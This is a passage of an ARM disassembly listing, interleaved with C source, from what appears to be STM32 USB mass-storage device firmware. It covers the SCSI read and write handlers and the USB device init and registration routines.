 800ab1a:	d102      	bne.n	800ab22 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ab1c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab20:	e012      	b.n	800ab48 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800ab22:	687a      	ldr	r2, [r7, #4]
 800ab24:	683b      	ldr	r3, [r7, #0]
 800ab26:	441a      	add	r2, r3
 800ab28:	697b      	ldr	r3, [r7, #20]
 800ab2a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab2e:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800ab30:	429a      	cmp	r2, r3
 800ab32:	d908      	bls.n	800ab46 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800ab34:	7af9      	ldrb	r1, [r7, #11]
 800ab36:	2321      	movs	r3, #33	; 0x21
 800ab38:	2205      	movs	r2, #5
 800ab3a:	68f8      	ldr	r0, [r7, #12]
 800ab3c:	f7ff fb62 	bl	800a204 <SCSI_SenseCode>
    return -1;
 800ab40:	f04f 33ff 	mov.w	r3, #4294967295
 800ab44:	e000      	b.n	800ab48 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800ab46:	2300      	movs	r3, #0
}
 800ab48:	4618      	mov	r0, r3
 800ab4a:	3718      	adds	r7, #24
 800ab4c:	46bd      	mov	sp, r7
 800ab4e:	bd80      	pop	{r7, pc}

0800ab50 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ab50:	b590      	push	{r4, r7, lr}
 800ab52:	b085      	sub	sp, #20
 800ab54:	af00      	add	r7, sp, #0
 800ab56:	6078      	str	r0, [r7, #4]
 800ab58:	460b      	mov	r3, r1
 800ab5a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab5c:	687b      	ldr	r3, [r7, #4]
 800ab5e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab62:	687b      	ldr	r3, [r7, #4]
 800ab64:	32b0      	adds	r2, #176	; 0xb0
 800ab66:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab6a:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ab6c:	68fb      	ldr	r3, [r7, #12]
 800ab6e:	2b00      	cmp	r3, #0
 800ab70:	d102      	bne.n	800ab78 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800ab72:	f04f 33ff 	mov.w	r3, #4294967295
 800ab76:	e07b      	b.n	800ac70 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ab78:	68fb      	ldr	r3, [r7, #12]
 800ab7a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab7e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ab80:	68fa      	ldr	r2, [r7, #12]
 800ab82:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ab86:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ab8a:	fb02 f303 	mul.w	r3, r2, r3
 800ab8e:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ab90:	68bb      	ldr	r3, [r7, #8]
 800ab92:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ab96:	bf28      	it	cs
 800ab98:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ab9c:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ab9e:	687b      	ldr	r3, [r7, #4]
 800aba0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800aba4:	687a      	ldr	r2, [r7, #4]
 800aba6:	33b0      	adds	r3, #176	; 0xb0
 800aba8:	009b      	lsls	r3, r3, #2
 800abaa:	4413      	add	r3, r2
 800abac:	685b      	ldr	r3, [r3, #4]
 800abae:	691c      	ldr	r4, [r3, #16]
 800abb0:	68fb      	ldr	r3, [r7, #12]
 800abb2:	f103 0110 	add.w	r1, r3, #16
 800abb6:	68fb      	ldr	r3, [r7, #12]
 800abb8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abbc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800abbe:	68fb      	ldr	r3, [r7, #12]
 800abc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abc4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800abc8:	4618      	mov	r0, r3
 800abca:	68bb      	ldr	r3, [r7, #8]
 800abcc:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800abd0:	b29b      	uxth	r3, r3
 800abd2:	78f8      	ldrb	r0, [r7, #3]
 800abd4:	47a0      	blx	r4
 800abd6:	4603      	mov	r3, r0
 800abd8:	2b00      	cmp	r3, #0
 800abda:	da08      	bge.n	800abee <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800abdc:	78f9      	ldrb	r1, [r7, #3]
 800abde:	2311      	movs	r3, #17
 800abe0:	2204      	movs	r2, #4
 800abe2:	6878      	ldr	r0, [r7, #4]
 800abe4:	f7ff fb0e 	bl	800a204 <SCSI_SenseCode>
    return -1;
 800abe8:	f04f 33ff 	mov.w	r3, #4294967295
 800abec:	e040      	b.n	800ac70 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800abee:	4b22      	ldr	r3, [pc, #136]	; (800ac78 <SCSI_ProcessRead+0x128>)
 800abf0:	7819      	ldrb	r1, [r3, #0]
 800abf2:	68fb      	ldr	r3, [r7, #12]
 800abf4:	f103 0210 	add.w	r2, r3, #16
 800abf8:	68bb      	ldr	r3, [r7, #8]
 800abfa:	6878      	ldr	r0, [r7, #4]
 800abfc:	f002 f8f4 	bl	800cde8 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ac00:	68fb      	ldr	r3, [r7, #12]
 800ac02:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac06:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac08:	68fb      	ldr	r3, [r7, #12]
 800ac0a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac0e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac12:	4619      	mov	r1, r3
 800ac14:	68bb      	ldr	r3, [r7, #8]
 800ac16:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac1a:	4413      	add	r3, r2
 800ac1c:	68fa      	ldr	r2, [r7, #12]
 800ac1e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac22:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ac24:	68fb      	ldr	r3, [r7, #12]
 800ac26:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac2a:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ac2c:	68fb      	ldr	r3, [r7, #12]
 800ac2e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac32:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac36:	4619      	mov	r1, r3
 800ac38:	68bb      	ldr	r3, [r7, #8]
 800ac3a:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac3e:	1ad3      	subs	r3, r2, r3
 800ac40:	68fa      	ldr	r2, [r7, #12]
 800ac42:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac46:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800ac48:	68fb      	ldr	r3, [r7, #12]
 800ac4a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac4e:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ac50:	68bb      	ldr	r3, [r7, #8]
 800ac52:	1ad3      	subs	r3, r2, r3
 800ac54:	68fa      	ldr	r2, [r7, #12]
 800ac56:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac5a:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ac5c:	68fb      	ldr	r3, [r7, #12]
 800ac5e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac62:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac64:	2b00      	cmp	r3, #0
 800ac66:	d102      	bne.n	800ac6e <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ac68:	68fb      	ldr	r3, [r7, #12]
 800ac6a:	2203      	movs	r2, #3
 800ac6c:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800ac6e:	2300      	movs	r3, #0
}
 800ac70:	4618      	mov	r0, r3
 800ac72:	3714      	adds	r7, #20
 800ac74:	46bd      	mov	sp, r7
 800ac76:	bd90      	pop	{r4, r7, pc}
 800ac78:	2000010a 	.word	0x2000010a

0800ac7c <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800ac7c:	b590      	push	{r4, r7, lr}
 800ac7e:	b085      	sub	sp, #20
 800ac80:	af00      	add	r7, sp, #0
 800ac82:	6078      	str	r0, [r7, #4]
 800ac84:	460b      	mov	r3, r1
 800ac86:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ac88:	687b      	ldr	r3, [r7, #4]
 800ac8a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ac8e:	687b      	ldr	r3, [r7, #4]
 800ac90:	32b0      	adds	r2, #176	; 0xb0
 800ac92:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ac96:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ac98:	68fb      	ldr	r3, [r7, #12]
 800ac9a:	2b00      	cmp	r3, #0
 800ac9c:	d102      	bne.n	800aca4 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ac9e:	f04f 33ff 	mov.w	r3, #4294967295
 800aca2:	e08e      	b.n	800adc2 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aca4:	68fb      	ldr	r3, [r7, #12]
 800aca6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acaa:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800acac:	68fa      	ldr	r2, [r7, #12]
 800acae:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acb2:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800acb6:	fb02 f303 	mul.w	r3, r2, r3
 800acba:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800acbc:	68bb      	ldr	r3, [r7, #8]
 800acbe:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800acc2:	bf28      	it	cs
 800acc4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800acc8:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800acca:	687b      	ldr	r3, [r7, #4]
 800accc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800acd0:	687a      	ldr	r2, [r7, #4]
 800acd2:	33b0      	adds	r3, #176	; 0xb0
 800acd4:	009b      	lsls	r3, r3, #2
 800acd6:	4413      	add	r3, r2
 800acd8:	685b      	ldr	r3, [r3, #4]
 800acda:	695c      	ldr	r4, [r3, #20]
 800acdc:	68fb      	ldr	r3, [r7, #12]
 800acde:	f103 0110 	add.w	r1, r3, #16
 800ace2:	68fb      	ldr	r3, [r7, #12]
 800ace4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ace8:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800acea:	68fb      	ldr	r3, [r7, #12]
 800acec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acf0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800acf4:	4618      	mov	r0, r3
 800acf6:	68bb      	ldr	r3, [r7, #8]
 800acf8:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800acfc:	b29b      	uxth	r3, r3
 800acfe:	78f8      	ldrb	r0, [r7, #3]
 800ad00:	47a0      	blx	r4
 800ad02:	4603      	mov	r3, r0
 800ad04:	2b00      	cmp	r3, #0
 800ad06:	da08      	bge.n	800ad1a <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800ad08:	78f9      	ldrb	r1, [r7, #3]
 800ad0a:	2303      	movs	r3, #3
 800ad0c:	2204      	movs	r2, #4
 800ad0e:	6878      	ldr	r0, [r7, #4]
 800ad10:	f7ff fa78 	bl	800a204 <SCSI_SenseCode>
    return -1;
 800ad14:	f04f 33ff 	mov.w	r3, #4294967295
 800ad18:	e053      	b.n	800adc2 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ad1a:	68fb      	ldr	r3, [r7, #12]
 800ad1c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad20:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ad22:	68fb      	ldr	r3, [r7, #12]
 800ad24:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad28:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad2c:	4619      	mov	r1, r3
 800ad2e:	68bb      	ldr	r3, [r7, #8]
 800ad30:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad34:	4413      	add	r3, r2
 800ad36:	68fa      	ldr	r2, [r7, #12]
 800ad38:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad3c:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800ad3e:	68fb      	ldr	r3, [r7, #12]
 800ad40:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad44:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800ad46:	68fb      	ldr	r3, [r7, #12]
 800ad48:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad4c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad50:	4619      	mov	r1, r3
 800ad52:	68bb      	ldr	r3, [r7, #8]
 800ad54:	fbb3 f3f1 	udiv	r3, r3, r1
 800ad58:	1ad3      	subs	r3, r2, r3
 800ad5a:	68fa      	ldr	r2, [r7, #12]
 800ad5c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad60:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800ad62:	68fb      	ldr	r3, [r7, #12]
 800ad64:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad68:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800ad6a:	68bb      	ldr	r3, [r7, #8]
 800ad6c:	1ad3      	subs	r3, r2, r3
 800ad6e:	68fa      	ldr	r2, [r7, #12]
 800ad70:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad74:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800ad76:	68fb      	ldr	r3, [r7, #12]
 800ad78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad7c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad7e:	2b00      	cmp	r3, #0
 800ad80:	d104      	bne.n	800ad8c <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800ad82:	2100      	movs	r1, #0
 800ad84:	6878      	ldr	r0, [r7, #4]
 800ad86:	f7fe fc53 	bl	8009630 <MSC_BOT_SendCSW>
 800ad8a:	e019      	b.n	800adc0 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800ad8c:	68fb      	ldr	r3, [r7, #12]
 800ad8e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad92:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad94:	68fa      	ldr	r2, [r7, #12]
 800ad96:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad9a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad9e:	fb02 f303 	mul.w	r3, r2, r3
 800ada2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ada6:	bf28      	it	cs
 800ada8:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800adac:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800adae:	4b07      	ldr	r3, [pc, #28]	; (800adcc <SCSI_ProcessWrite+0x150>)
 800adb0:	7819      	ldrb	r1, [r3, #0]
 800adb2:	68fb      	ldr	r3, [r7, #12]
 800adb4:	f103 0210 	add.w	r2, r3, #16
 800adb8:	68bb      	ldr	r3, [r7, #8]
 800adba:	6878      	ldr	r0, [r7, #4]
 800adbc:	f002 f84c 	bl	800ce58 <USBD_LL_PrepareReceive>
  }

  return 0;
 800adc0:	2300      	movs	r3, #0
}
 800adc2:	4618      	mov	r0, r3
 800adc4:	3714      	adds	r7, #20
 800adc6:	46bd      	mov	sp, r7
 800adc8:	bd90      	pop	{r4, r7, pc}
 800adca:	bf00      	nop
 800adcc:	2000010b 	.word	0x2000010b

0800add0 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800add0:	b480      	push	{r7}
 800add2:	b087      	sub	sp, #28
 800add4:	af00      	add	r7, sp, #0
 800add6:	60f8      	str	r0, [r7, #12]
 800add8:	60b9      	str	r1, [r7, #8]
 800adda:	4613      	mov	r3, r2
 800addc:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800adde:	88fb      	ldrh	r3, [r7, #6]
 800ade0:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800ade2:	68fb      	ldr	r3, [r7, #12]
 800ade4:	2b00      	cmp	r3, #0
 800ade6:	d102      	bne.n	800adee <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800ade8:	f04f 33ff 	mov.w	r3, #4294967295
 800adec:	e013      	b.n	800ae16 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800adee:	8afa      	ldrh	r2, [r7, #22]
 800adf0:	68fb      	ldr	r3, [r7, #12]
 800adf2:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800adf4:	e00b      	b.n	800ae0e <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800adf6:	8afb      	ldrh	r3, [r7, #22]
 800adf8:	3b01      	subs	r3, #1
 800adfa:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800adfc:	8afb      	ldrh	r3, [r7, #22]
 800adfe:	68ba      	ldr	r2, [r7, #8]
 800ae00:	441a      	add	r2, r3
 800ae02:	8afb      	ldrh	r3, [r7, #22]
 800ae04:	7811      	ldrb	r1, [r2, #0]
 800ae06:	68fa      	ldr	r2, [r7, #12]
 800ae08:	4413      	add	r3, r2
 800ae0a:	460a      	mov	r2, r1
 800ae0c:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ae0e:	8afb      	ldrh	r3, [r7, #22]
 800ae10:	2b00      	cmp	r3, #0
 800ae12:	d1f0      	bne.n	800adf6 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ae14:	2300      	movs	r3, #0
}
 800ae16:	4618      	mov	r0, r3
 800ae18:	371c      	adds	r7, #28
 800ae1a:	46bd      	mov	sp, r7
 800ae1c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ae20:	4770      	bx	lr

0800ae22 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800ae22:	b580      	push	{r7, lr}
 800ae24:	b086      	sub	sp, #24
 800ae26:	af00      	add	r7, sp, #0
 800ae28:	60f8      	str	r0, [r7, #12]
 800ae2a:	60b9      	str	r1, [r7, #8]
 800ae2c:	4613      	mov	r3, r2
 800ae2e:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800ae30:	68fb      	ldr	r3, [r7, #12]
 800ae32:	2b00      	cmp	r3, #0
 800ae34:	d101      	bne.n	800ae3a <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae36:	2303      	movs	r3, #3
 800ae38:	e01f      	b.n	800ae7a <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800ae3a:	68fb      	ldr	r3, [r7, #12]
 800ae3c:	2200      	movs	r2, #0
 800ae3e:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800ae42:	68fb      	ldr	r3, [r7, #12]
 800ae44:	2200      	movs	r2, #0
 800ae46:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800ae4a:	68fb      	ldr	r3, [r7, #12]
 800ae4c:	2200      	movs	r2, #0
 800ae4e:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800ae52:	68bb      	ldr	r3, [r7, #8]
 800ae54:	2b00      	cmp	r3, #0
 800ae56:	d003      	beq.n	800ae60 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800ae58:	68fb      	ldr	r3, [r7, #12]
 800ae5a:	68ba      	ldr	r2, [r7, #8]
 800ae5c:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800ae60:	68fb      	ldr	r3, [r7, #12]
 800ae62:	2201      	movs	r2, #1
 800ae64:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800ae68:	68fb      	ldr	r3, [r7, #12]
 800ae6a:	79fa      	ldrb	r2, [r7, #7]
 800ae6c:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800ae6e:	68f8      	ldr	r0, [r7, #12]
 800ae70:	f001 fdb6 	bl	800c9e0 <USBD_LL_Init>
 800ae74:	4603      	mov	r3, r0
 800ae76:	75fb      	strb	r3, [r7, #23]

  return ret;
 800ae78:	7dfb      	ldrb	r3, [r7, #23]
}
 800ae7a:	4618      	mov	r0, r3
 800ae7c:	3718      	adds	r7, #24
 800ae7e:	46bd      	mov	sp, r7
 800ae80:	bd80      	pop	{r7, pc}

0800ae82 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800ae82:	b580      	push	{r7, lr}
 800ae84:	b084      	sub	sp, #16
 800ae86:	af00      	add	r7, sp, #0
 800ae88:	6078      	str	r0, [r7, #4]
 800ae8a:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800ae8c:	2300      	movs	r3, #0
 800ae8e:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800ae90:	683b      	ldr	r3, [r7, #0]
 800ae92:	2b00      	cmp	r3, #0
 800ae94:	d101      	bne.n	800ae9a <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800ae96:	2303      	movs	r3, #3
 800ae98:	e025      	b.n	800aee6 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800ae9a:	687b      	ldr	r3, [r7, #4]
 800ae9c:	683a      	ldr	r2, [r7, #0]
 800ae9e:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800aea2:	687b      	ldr	r3, [r7, #4]
 800aea4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aea8:	687b      	ldr	r3, [r7, #4]
 800aeaa:	32ae      	adds	r2, #174	; 0xae
 800aeac:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aeb0:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aeb2:	2b00      	cmp	r3, #0
 800aeb4:	d00f      	beq.n	800aed6 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800aeb6:	687b      	ldr	r3, [r7, #4]
 800aeb8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800aebc:	687b      	ldr	r3, [r7, #4]
 800aebe:	32ae      	adds	r2, #174	; 0xae
 800aec0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800aec4:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800aec6:	f107 020e 	add.w	r2, r7, #14
 800aeca:	4610      	mov	r0, r2
 800aecc:	4798      	blx	r3
 800aece:	4602      	mov	r2, r0
 800aed0:	687b      	ldr	r3, [r7, #4]
 800aed2:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800aed6:	687b      	ldr	r3, [r7, #4]
 800aed8:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800aedc:	1c5a      	adds	r2, r3, #1
 800aede:	687b      	ldr	r3, [r7, #4]
 800aee0:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800aee4:	2300      	movs	r3, #0
}
 800aee6:	4618      	mov	r0, r3
 800aee8:	3710      	adds	r7, #16
 800aeea:	46bd      	mov	sp, r7
 800aeec:	bd80      	pop	{r7, pc}

0800aeee <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800aeee:	b580      	push	{r7, lr}
 800aef0:	b082      	sub	sp, #8
 800aef2:	af00      	add	r7, sp, #0
 800aef4:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800aef6:	6878      	ldr	r0, [r7, #4]
 800aef8:	f001 fdca 	bl	800ca90 <USBD_LL_Start>
 800aefc:	4603      	mov	r3, r0
}
 800aefe:	4618      	mov	r0, r3
 800af00:	3708      	adds	r7, #8
 800af02:	46bd      	mov	sp, r7
 800af04:	bd80      	pop	{r7, pc}

0800af06 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800af06:	b480      	push	{r7}
 800af08:	b083      	sub	sp, #12
 800af0a:	af00      	add	r7, sp, #0
 800af0c:	6078      	str	r0, [r7, #4]
  return ret;
#else
